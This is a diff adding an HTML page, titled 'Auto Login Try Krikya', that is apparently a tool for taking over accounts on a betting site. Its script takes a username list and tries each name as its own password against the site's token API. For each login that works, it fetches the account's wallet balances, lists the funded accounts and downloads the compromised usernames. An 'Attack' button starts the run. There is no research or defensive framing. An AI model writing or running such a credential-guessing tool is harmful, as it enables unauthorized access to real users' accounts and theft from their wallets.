@@ -1,0 +1,1162 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Auto Login Try Krikya</title>
+    <style>
+        
+
+        body,
+        h1,
+        p,
+        ul,
+        li {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            color: #fff;
+        }
+
+        header {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            background-color: #333;
+            padding: 10px 20px;
+            text-align: center;
+            z-index: 1000;
+        }
+
+        .body {
+            width: 100%;
+            max-width: 600px;
+            margin: 80px auto 100px;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+
+        header {
+            height: 60px;
+            background-color: #282828;
+            margin-bottom: 10px;
+            box-shadow: 10px 4px 8px #212121;
+        }
+
+        .fixed-button {
+            position: fixed;
+            border-radius: 5px;
+            padding: 10px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+
+        .hidden {
+            display: none;
+        }
+
+        .go-top-bottom {
+            right: 10px;
+            color: aliceblue;
+            bottom: 10px;
+        }
+
+        .go-down-bottom {
+            right: 10px;
+            color: aliceblue;
+        }
+
+        .console-log {
+            width: 100%;
+            height: 200px;
+            overflow-y: auto;
+            background: black;
+            color: lime;
+            font-family: monospace;
+            padding: 10px;
+            border: 1px solid #ccc;
+            box-shadow: 3px 3px 10px rgba(0, 0, 0, 1), -1px -1px 6px rgba(255, 255, 255, 0.4);
+        }
+
+        .balance-blue {
+            color: #1c0f8e;
+            background-color: aliceblue;
+            box-shadow: 3px 3px 10px rgba(0, 0, 0, 1), -1px -1px 6px rgba(255, 255, 255, 0.4);
+            text-align: center;
+            text-shadow: 3px 3px 10px rgba(0, 0, 0, 1), -1px -1px 6px rgba(255, 255, 255, 0.4);
+            font-weight: bolder;
+        }
+
+        #textInput {
+            color: rgb(9, 10, 10);
+            box-shadow: 3px 3px 10px rgba(0, 0, 0, 1), -1px -1px 6px rgba(255, 255, 255, 0.4);
+        }
+
+
+        #errorOutput {
+            color: lime;
+            background-color: black;
+            min-height: 150px;
+            max-height: 300px;
+            overflow-y: auto;
+            padding: 10px;
+            border: none;
+            font-size: x-small;
+        }
+
+        .line {
+            border: none;
+            margin: 5px;
+        }
+
+        #successOutput {
+            min-height: 200px;
+            background-color: #212121;
+        }
+
+        .tooltip-container {
+            --background: #4132c9;
+            --support-size: 50px;
+            --tooltip-radius: 10px 10px 10px 0;
+            --outline-border-color: #0096aa;
+            position: relative;
+            background: transparent;
+            cursor: pointer;
+            transition: all 0.2s;
+            font-size: 17px;
+            font-weight: bold;
+            padding: 0.7em 1.8em;
+            color: var(--background);
+            border: solid 2px var(--background);
+        }
+
+        .tooltip-container::before {
+            content: "";
+            display: inline-block;
+            border-radius: 50%;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: -1;
+            transition: all 0.5s linear;
+            outline: 3px solid transparent;
+            background: var(--background);
+        }
+
+        .tooltip-container:hover {
+            color: white;
+        }
+
+        .tooltip-container:hover:before {
+            width: 100%;
+            height: 100%;
+            border-radius: 0;
+            outline-offset: 5px;
+            outline-color: var(--outline-border-color);
+        }
+
+        .tooltip {
+            position: absolute;
+            display: inline-block;
+            top: 0;
+            left: 50%;
+            transform: translateX(-5%);
+            padding: 0.3em 0.6em;
+            opacity: 0;
+            pointer-events: none;
+            transition: all 0.3s;
+            background: var(--background);
+            border-radius: var(--tooltip-radius);
+            color: white;
+            box-shadow: 3px 3px 0px var(--outline-border-color);
+        }
+
+        .tooltip::after {
+            content: "Hello!👋";
+            display: inline-block;
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: var(--background);
+            text-align: center;
+            border-radius: var(--tooltip-radius);
+        }
+
+        .tooltip::before {
+            position: absolute;
+            content: "";
+            bottom: 0;
+            border-style: solid;
+            border-width: 10px;
+            left: 0;
+            transform: translateX(-50%);
+            border-color: transparent var(--background) var(--background) transparent;
+            box-shadow: 0px 3px 0px var(--outline-border-color);
+        }
+
+        .tooltip-container:hover .tooltip::after {
+            animation: hidden 0.5s 1.5s linear forwards;
+        }
+
+        .tooltip-container:hover .tooltip {
+            top: calc(-100% - var(--support-size) * 0.5);
+            opacity: 1;
+            visibility: visible;
+            pointer-events: auto;
+            animation: shake 0.5s 1s linear;
+            transition: all 0.3s 0.5s;
+        }
+
+        @keyframes hidden {
+            50% {
+                transform: translate(-50%, -50%) scale(0.5);
+                background-color: #1c9ef54d;
+            }
+
+            100% {
+                transform: translate(0, -50%) scale(0.5);
+                opacity: 0;
+            }
+        }
+
+        @keyframes shake {
+
+            0%,
+            40%,
+            80% {
+                transform: translateX(-10%);
+            }
+
+            20%,
+            60%,
+            100% {
+                transform: translateX(0);
+            }
+        }
+
+        .st2 {
+            fill: #f9c8a7;
+        }
+
+        .st3 {
+            fill: #ff9e97;
+        }
+
+        .st6 {
+            fill: #d72e48;
+        }
+
+        .st7 {
+            fill: #ffffff;
+        }
+
+        .st8 {
+            fill: #ff8d7f;
+        }
+
+        .st10 {
+            fill: #3d3d3b;
+        }
+
+        .st11 {
+            fill: #1c9ef547;
+        }
+
+        .st12 {
+            opacity: 0.2;
+        }
+
+        .st14 {
+            fill: #b7b7b7;
+        }
+
+        .st15 {
+            fill: #ead9cf;
+        }
+
+        #Calque_1 {
+            display: inline-block;
+            height: var(--support-size);
+            position: absolute;
+            opacity: 0;
+            transition: all 0.5s;
+            z-index: -1;
+            left: 0;
+            top: 0;
+        }
+
+        #left_x5F_arm_2_ {
+            transform: translateX(2px);
+        }
+
+        .tooltip-container:hover #Calque_1 {
+            top: calc(var(--support-size) * -1);
+            opacity: 1;
+        }
+
+        .download_button {
+            width: 100%;
+            margin: 5px;
+        }
+
+        .stop-button {
+            position: fixed;
+            left: 0;
+        }
+
+        .clear-btn {
+            background-color: transparent;
+            box-shadow: 3px 3px 10px rgba(0, 0, 0, 1), -1px -1px 6px rgba(255, 255, 255, 0.4);
+            position: absolute;
+            top: 10;
+            right: 0;
+        }
+
+        .clear-btn:hover {
+            background-color: #786060;
+        }
+
+        .text-input {
+            height: 100px;
+            margin-left: 200px;
+            box-shadow: 3px 3px 10px rgba(0, 0, 0, 1), -1px -1px 6px rgba(255, 255, 255, 0.4);
+            color: #ffffff;
+            text-align: center;
+            background: rgba(255, 255, 255, 0.2);
+        }
+
+        .main-button {
+            height: 70px;
+            margin-bottom: 20px;
+            font-size: 36px;
+            font-weight: bolder;
+            --transition: 350ms;
+            --folder-W: 120px;
+            --folder-H: 80px;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-end;
+            box-shadow: 3px 3px 10px rgba(0, 0, 0, 1), -1px -1px 6px rgba(81, 75, 75, 0.4);
+            position: relative;
+            color: #c00f35;
+            text-align: center;
+            background: rgba(255, 255, 255, 0.2);
+            border: none;
+            border-radius: 10px;
+            text-shadow: 3px 3px 10px rgba(0, 0, 0, 1), -1px -1px 6px rgba(255, 255, 255, 0.4);
+            cursor: pointer;
+            transition: background var(--transition) ease;
+            display: inline-block;
+            width: 100%;
+            padding: 10px 35px;
+            position: relative;
+            text-shadow: #3c0dbf;
+
+        }
+
+        .container {
+            --transition: 350ms;
+            --folder-W: 120px;
+            --folder-H: 80px;
+            flex-direction: column;
+            align-items: center;
+            padding: 10px;
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.2);
+            height: calc(var(--folder-H) * 1.7);
+            position: relative;
+        }
+
+        .folder {
+            top: -20px;
+            left: calc(50% - 60px);
+            animation: float 2.5s infinite ease-in-out;
+            transition: transform var(--transition) ease;
+        }
+
+        .folder:hover {
+            transform: scale(1.05);
+        }
+
+        .folder .front-side,
+        .folder .back-side {
+            position: absolute;
+            transition: transform var(--transition);
+            transform-origin: bottom center;
+        }
+
+        .folder .back-side::before,
+        .folder .back-side::after {
+            content: "";
+            display: block;
+            background-color: white;
+            opacity: 0.5;
+            z-index: 0;
+            width: var(--folder-W);
+            height: var(--folder-H);
+            position: absolute;
+            transform-origin: bottom center;
+            border-radius: 15px;
+            transition: transform 350ms;
+            z-index: 0;
+        }
+
+        .container:hover .back-side::before {
+            transform: rotateX(-5deg) skewX(5deg);
+        }
+
+        .container:hover .back-side::after {
+            transform: rotateX(-15deg) skewX(12deg);
+        }
+
+        .folder .front-side {
+            z-index: 1;
+        }
+
+        .container:hover .front-side {
+            transform: rotateX(-40deg) skewX(15deg);
+        }
+
+        .folder .tip {
+            background: linear-gradient(135deg, #ff9a56, #ff6f56);
+            width: 80px;
+            height: 20px;
+            border-radius: 12px 12px 0 0;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+            position: absolute;
+            top: -10px;
+            z-index: 2;
+        }
+
+        .folder .cover {
+            background: linear-gradient(135deg, #ffe563, #ffc663);
+            width: var(--folder-W);
+            height: var(--folder-H);
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+            cursor: pointer;
+        }
+
+        .custom-file-upload {
+            font-size: 1.1em;
+            color: #ffffff;
+            text-align: center;
+            border: none;
+            border-radius: 10px;
+            box-shadow: 3px 3px 10px rgba(0, 0, 0, 1), -1px -1px 6px rgba(255, 255, 255, 0.4);
+            cursor: pointer;
+            transition: background var(--transition) ease;
+            padding: 10px 35px;
+            max-width: 30px;
+            position: absolute;
+        }
+
+        .custom-file-upload:hover {
+            background: rgba(255, 255, 255, 0.4);
+        }
+
+        .custom-file-upload input[type="file"] {
+            display: none;
+        }
+
+        @keyframes float {
+            0% {
+                transform: translateY(0px);
+            }
+
+            50% {
+                transform: translateY(-20px);
+            }
+
+            100% {
+                transform: translateY(0px);
+            }
+        }
+
+        .cssbuttons-io-button {
+            display: flex;
+            align-items: center;
+            font-family: inherit;
+            cursor: pointer;
+            font-weight: 500;
+            font-size: 16px;
+            padding: 0.7em 1.4em 0.7em 1.1em;
+            color: white;
+            background: #ad5389;
+            background: linear-gradient(0deg,
+                    rgba(20, 167, 62, 1) 0%,
+                    rgba(102, 247, 113, 1) 100%);
+            border: none;
+            box-shadow: 0 0.7em 1.5em -0.5em #14a73e98;
+            letter-spacing: 0.05em;
+            border-radius: 20em;
+        }
+
+        .cssbuttons-io-button svg {
+            margin-right: 6px;
+        }
+
+        .cssbuttons-io-button:hover {
+            box-shadow: 0 0.5em 1.5em -0.5em #14a73e98;
+        }
+
+        .cssbuttons-io-button:active {
+            box-shadow: 0 0.3em 1em -0.5em #14a73e98;
+        }
+
+        #successOutput h3 {
+            color: #d72e48;
+            margin: 3px;
+        }
+
+        #errorOutput p {
+            color: #e8f712;
+            margin: 5px;
+            letter-spacing: 1em;
+        }
+
+        #errorOutput h3 {
+            letter-spacing: 0.1em;
+        }
+
+        #wordList {
+            width: 50px;
+            margin: 10px;
+            font-size: xx-small;
+        }
+
+        #wordList li {
+            color: #ff9e97;
+        }
+
+        #loading {
+            display: none;
+        }
+
+        .loader_container {
+            position: absolute;
+            width: 50px;
+            height: 50px;
+            top: 0;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            margin: auto
+        }
+
+        .item_loader {
+            width: 30px;
+            height: 30px;
+            position: absolute
+        }
+
+        .item-1 {
+            background-color: #fa5667;
+            top: 0;
+            left: 0;
+            z-index: 1;
+            -webkit-animation: item-1_move 1.8s cubic-bezier(.6, .01, .4, 1) infinite;
+            animation: item-1_move 1.8s cubic-bezier(.6, .01, .4, 1) infinite
+        }
+
+        .item-2 {
+            background-color: #7a45e5;
+            top: 0;
+            right: 0;
+            -webkit-animation: item-2_move 1.8s cubic-bezier(.6, .01, .4, 1) infinite;
+            animation: item-2_move 1.8s cubic-bezier(.6, .01, .4, 1) infinite
+        }
+
+        .item-3 {
+            background-color: #1b91f7;
+            bottom: 0;
+            right: 0;
+            z-index: 1;
+            -webkit-animation: item-3_move 1.8s cubic-bezier(.6, .01, .4, 1) infinite;
+            animation: item-3_move 1.8s cubic-bezier(.6, .01, .4, 1) infinite
+        }
+
+        .item-4 {
+            background-color: #fac24c;
+            bottom: 0;
+            left: 0;
+            -webkit-animation: item-4_move 1.8s cubic-bezier(.6, .01, .4, 1) infinite;
+            animation: item-4_move 1.8s cubic-bezier(.6, .01, .4, 1) infinite
+        }
+
+        @-webkit-keyframes item-1_move {
+
+            0%,
+            to {
+                -webkit-transform: translate(0);
+                transform: translate(0)
+            }
+
+            25% {
+                -webkit-transform: translateY(30px);
+                transform: translateY(30px)
+            }
+
+            50% {
+                -webkit-transform: translate(30px, 30px);
+                transform: translate(30px, 30px)
+            }
+
+            75% {
+                -webkit-transform: translate(30px);
+                transform: translate(30px)
+            }
+        }
+
+        @keyframes item-1_move {
+
+            0%,
+            to {
+                -webkit-transform: translate(0);
+                transform: translate(0)
+            }
+
+            25% {
+                -webkit-transform: translateY(30px);
+                transform: translateY(30px)
+            }
+
+            50% {
+                -webkit-transform: translate(30px, 30px);
+                transform: translate(30px, 30px)
+            }
+
+            75% {
+                -webkit-transform: translate(30px);
+                transform: translate(30px)
+            }
+        }
+
+        @-webkit-keyframes item-2_move {
+
+            0%,
+            to {
+                -webkit-transform: translate(0);
+                transform: translate(0)
+            }
+
+            25% {
+                -webkit-transform: translate(-30px);
+                transform: translate(-30px)
+            }
+
+            50% {
+                -webkit-transform: translate(-30px, 30px);
+                transform: translate(-30px, 30px)
+            }
+
+            75% {
+                -webkit-transform: translateY(30px);
+                transform: translateY(30px)
+            }
+        }
+
+        @keyframes item-2_move {
+
+            0%,
+            to {
+                -webkit-transform: translate(0);
+                transform: translate(0)
+            }
+
+            25% {
+                -webkit-transform: translate(-30px);
+                transform: translate(-30px)
+            }
+
+            50% {
+                -webkit-transform: translate(-30px, 30px);
+                transform: translate(-30px, 30px)
+            }
+
+            75% {
+                -webkit-transform: translateY(30px);
+                transform: translateY(30px)
+            }
+        }
+
+        @-webkit-keyframes item-3_move {
+
+            0%,
+            to {
+                -webkit-transform: translate(0);
+                transform: translate(0)
+            }
+
+            25% {
+                -webkit-transform: translateY(-30px);
+                transform: translateY(-30px)
+            }
+
+            50% {
+                -webkit-transform: translate(-30px, -30px);
+                transform: translate(-30px, -30px)
+            }
+
+            75% {
+                -webkit-transform: translate(-30px);
+                transform: translate(-30px)
+            }
+        }
+
+        @keyframes item-3_move {
+
+            0%,
+            to {
+                -webkit-transform: translate(0);
+                transform: translate(0)
+            }
+
+            25% {
+                -webkit-transform: translateY(-30px);
+                transform: translateY(-30px)
+            }
+
+            50% {
+                -webkit-transform: translate(-30px, -30px);
+                transform: translate(-30px, -30px)
+            }
+
+            75% {
+                -webkit-transform: translate(-30px);
+                transform: translate(-30px)
+            }
+        }
+
+        @-webkit-keyframes item-4_move {
+
+            0%,
+            to {
+                -webkit-transform: translate(0);
+                transform: translate(0)
+            }
+
+            25% {
+                -webkit-transform: translate(30px);
+                transform: translate(30px)
+            }
+
+            50% {
+                -webkit-transform: translate(30px, -30px);
+                transform: translate(30px, -30px)
+            }
+
+            75% {
+                -webkit-transform: translateY(-30px);
+                transform: translateY(-30px)
+            }
+        }
+
+        @keyframes item-4_move {
+
+            0%,
+            to {
+                -webkit-transform: translate(0);
+                transform: translate(0)
+            }
+
+            25% {
+                -webkit-transform: translate(30px);
+                transform: translate(30px)
+            }
+
+            50% {
+                -webkit-transform: translate(30px, -30px);
+                transform: translate(30px, -30px)
+            }
+
+            75% {
+                -webkit-transform: translateY(-30px);
+                transform: translateY(-30px)
+            }
+        }
+
+        footer {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background: transparent;
+            color: #fff;
+            padding: 10px 20px;
+            text-align: center;
+            z-index: 1000;
+        }
+
+        /* Navigation menu in footer */
+        footer nav ul {
+            display: flex;
+            justify-content: space-around;
+            list-style: none;
+        }
+
+        footer nav ul li {
+            margin: 0 10px;
+        }
+
+        footer nav ul li a {
+            color: #fff;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        /* Media query for smaller screens */
+        @media (max-width: 480px) {
+            h1 {
+                font-size: 20px;
+            }
+
+            p {
+                font-size: 14px;
+            }
+
+            footer nav ul li a {
+                font-size: 12px;
+            }
+        }
+
+        .word-list {
+            color: #ead9cf;
+        }
+        output-container {
+            color: #fff;
+        }
+    </style>
+
+</head>
+
+<body>
+    <header>
+        <div id="loading" class="loader_container">
+            <div class="item_loader item-1"></div>
+            <div class="item_loader item-2"></div>
+            <div class="item_loader item-3"></div>
+            <div class="item_loader item-4"></div>
+        </div>
+        <button type="button" class="fixed-button go-down-bottom"
+            onclick="window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });">⬇️</button>
+    </header>
+    <div class="body">
+        <div class="container">
+            <div class="folder">
+                <div class="front-side">
+                    <div class="tip"></div>
+                    <div class="cover"></div>
+                    <div class="back-side cover"></div>
+                    <label for="fileInput">Upload</label>
+                    <input oninput="generateWordList()" id="fileInput" class="custom-file-upload" type="file"
+                        title="" />
+                </div>
+                <label for="textInput"></label>
+                <input class="text-input" oninput="generateWordList()" id="textInput" type="text"
+                    placeholder="Enter text here">
+            </div>
+        </div>
+        <button class="clear-btn" type="button" id="clearButton">❌</button>
+        <div class="output-container" id="output"></div>
+
+        <button type="button" id="downloadBtn" class="download_button" onclick="downloadResponses()" style="display:none;">Download</button>
+
+        <div class="error-output" id="errorOutput">
+            <h2>E r r o r . . . . </h2>
+        </div>
+        <div class="line"></div>
+        <div id="successContainer">
+            <div id="successOutput"></div>
+        </div>
+        <div class="word_list" onchange="sortWordListAscending()" id="wordList"></div>
+    </div>
+
+    <footer>
+        <nav>
+            <ul>
+                <li>
+                    <button id="attackButton" type="button" class="main-button button-63"
+                        onclick="processLoginFile()">Attack</button>
+                    <button id="attackstopButton" type="button" class="main-button button-63" style="display: none;"
+                        onclick="stopLoginAttempts()">STOP</button>
+                </li>
+            </ul>
+            <button type="button" class="fixed-button go-top-bottom"
+                onclick="window.scrollTo({ top: 0, behavior: 'smooth' });">🔝</button>
+        </nav>
+    </footer>
+
+
+    <script>
+
+        function generateWordList() {
+            const text = document.getElementById('textInput').value;
+            const fileInput = document.getElementById('fileInput');
+            let words = text.split(/\s+/).filter(word => word);
+
+            if (fileInput.files.length > 0) {
+                const file = fileInput.files[0];
+                const reader = new FileReader();
+                reader.onload = function (e) {
+                    const fileText = e.target.result;
+                    words = words.concat(fileText.split(/\s+/).filter(word => word));
+                    processWords(words);
+                };
+                reader.readAsText(file);
+            } else {
+                processWords(words);
+            }
+        }
+
+        function processWords(words) {
+            const uniqueWords = [...new Set(words)];
+            uniqueWords.sort();
+            const wordListElement = document.getElementById('wordList');
+            wordListElement.innerHTML = '';
+            uniqueWords.forEach(word => {
+                const li = document.createElement('li');
+                li.textContent = word;
+                wordListElement.appendChild(li);
+            });
+        }
+
+        function removeDuplicates() {
+            const wordListElement = document.getElementById('wordList');
+            const uniqueWords = [...new Set(Array.from(wordListElement.querySelectorAll('li')).map(li => li.textContent))];
+            wordListElement.innerHTML = '';
+            uniqueWords.forEach(word => {
+                const li = document.createElement('li');
+                li.textContent = word;
+                wordListElement.appendChild(li);
+            });
+        }
+
+        function sortWordListAscending() {
+            const wordListElement = document.getElementById('wordList');
+            const words = Array.from(wordListElement.querySelectorAll('li')).map(li => li.textContent);
+            words.sort();
+            wordListElement.innerHTML = '';
+            words.forEach(word => {
+                const li = document.createElement('li');
+                li.textContent = word;
+                wordListElement.appendChild(li);
+            });
+        }
+
+        function downloadUsernames() {
+            const wordListElement = document.getElementById('wordList');
+            const usernames = Array.from(wordListElement.querySelectorAll('li')).map(li => li.textContent).join('\n');
+            const blob = new Blob([usernames], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'successID.txt';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+        }
+
+        document.getElementById("clearButton").addEventListener("click", function () {
+            document.getElementById("wordList").innerHTML = "";
+            document.getElementById("output").innerHTML = "";
+            document.getElementById("textInput").value = "";
+            document.getElementById("errorOutput").innerHTML = "";
+        });
+
+        let stopRequested = false;
+        let successfulLogins = [];
+
+        function fetchUsernamesFromProcessedList() {
+            const wordListElement = document.getElementById('wordList');
+            const usernames = [];
+            wordListElement.querySelectorAll('li').forEach(li => {
+                usernames.push(li.textContent);
+            });
+            return usernames;
+        }
+
+        async function tryLogin(username) {
+            if (stopRequested) return null;
+            console.log('')
+
+            const loginData = {
+                domain: "https://www.krikya11.com",
+                membercode: username,
+                password: username,
+                platform: "desktop",
+                option: "2",
+            };
+
+            const loginResponse = await fetch("https://feapi.sharky777.xyz/api/token", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(loginData),
+            });
+
+            const loginResult = await loginResponse.json();
+
+            if (loginResponse.ok) {
+                await fetchWalletDetails(loginResult.access_token, username);
+            } else {
+                displayErrorResponse(loginResponse.error);
+                console.log(`Loginfailed: ${username}`);
+            }
+        }
+        async function fetchWalletDetails(token, username) {
+            if (stopRequested) return;
+
+            const response = await fetch(
+                "https://feapi.sharky777.xyz/api/member/wallets",
+                {
+                    method: "GET",
+                    headers: { Authorization: `Bearer ${token}` },
+                }
+            );
+
+            const result = await response.json();
+
+            if (response.ok) {
+                const wallets = result.data.wallets.map((wallet) => ({
+                    code: wallet.wallet_code,
+                    balance: parseFloat(wallet.balance),
+                }));
+                displaySuccessResponse(username, wallets);
+                successfulLogins.push({ username, wallets });
+                document.getElementById("downloadBtn").disabled = false;
+            }
+        }
+
+        function displaySuccessResponse(username, wallets) {
+            const successOutput = document.getElementById("successOutput");
+            const responseDiv = document.createElement("div");
+            responseDiv.innerHTML = `
+                <h3>${username}</h3>
+                <ul>
+                    ${wallets
+                    .map(
+                        (wallet) => `
+                        <li class="${wallet.balance >= 1 ? "balance-blue" : "hidden"}">
+                            ${wallet.code}: ${wallet.balance >= 1
+                                ? wallet.balance
+                                : parseInt(wallet.balance)
+                            }
+                        </li>
+                    `
+                    )
+                    .join("")}
+                </ul>
+            `;
+            successOutput.appendChild(responseDiv);
+        }
+
+
+
+        const attackButton = document.getElementById('attackButton');
+        const attackstopButton = document.getElementById('attackstopButton');
+
+        attackButton.addEventListener('click', () => {
+            attackButton.style.display = 'none';
+            attackstopButton.style.display = 'inline-block';
+        });
+
+        attackstopButton.addEventListener('click', () => {
+            processLoginFile();
+            attackButton.style.display = 'inline-block';
+            attackstopButton.style.display = 'none';
+            stopLoginAttempts();
+        });
+
+
+
+
+
+        async function processLoginFile() {
+            stopRequested = false;
+            successfulLogins = [];
+            document.getElementById("successOutput").innerHTML = "<h3>USERNAME</h3>";
+            document.getElementById("errorOutput").innerHTML = "<h3></h3>";
+            document.getElementById("output").innerHTML = "";
+            document.getElementById("downloadBtn").disabled = false;
+            document.getElementById("loading").style.display = "flex";
+
+            const usernames = fetchUsernamesFromProcessedList();
+            logMessage(`📂 TOTAL ${usernames.length} USERNAMES FOUND...`);
+
+            for (const username of usernames) {
+                if (stopRequested) {
+                    logMessage("STOPPED");
+                    document.getElementById("loading").style.display = "none";
+                    updateButton.style.display = "inline-block";
+                    stopButton.style.display = "none";
+                    return;
+                }
+                try {
+                    await tryLogin(username);
+                } catch (error) {
+                    displayErrorResponse(username, error);
+                }
+            }
+
+            document.getElementById("loading").style.display = "none";
+            downloadResponses();
+            alert("Login process finished!");
+        }
+
+        function displayErrorResponse(username, error) {
+            const errorOutput = document.getElementById("errorOutput");
+            const responseDiv = document.createElement("div");
+            responseDiv.innerHTML = `
+                <h3>${username}</h3>
+                <p>Error: ${error.logMessage}</p>
+            `;
+            errorOutput.appendChild(responseDiv);
+            errorOutput.scrollTop = errorOutput.scrollHeight;
+        }
+
+        function stopLoginAttempts() {
+            stopRequested = true;
+            logMessage("⏹ Stopped");
+            document.getElementById("loading").style.display = "none";
+        }
+
+        function logMessage(message) {
+            const output = document.getElementById("output");
+            output.textContent += message + "\n";
+        }
+
+        function downloadResponses() {
+            if (successfulLogins.length === 0) {
+                alert("No usernames available for download.");
+                return;
+            }
+
+            const usernamesContent = successfulLogins
+                .map((login) => login.username)
+                .join("\n");
+
+            const usernamesBlob = new Blob([usernamesContent], { type: "text/plain" });
+            const usernamesUrl = URL.createObjectURL(usernamesBlob);
+            const usernamesA = document.createElement("a");
+            usernamesA.href = usernamesUrl;
+            usernamesA.download = "usernames.txt";
+            document.body.appendChild(usernamesA);
+            usernamesA.click();
+            document.body.removeChild(usernamesA);
+            URL.revokeObjectURL(usernamesUrl);
+        }
+    </script>
+
+
+
+
+</body>
+
+</html>
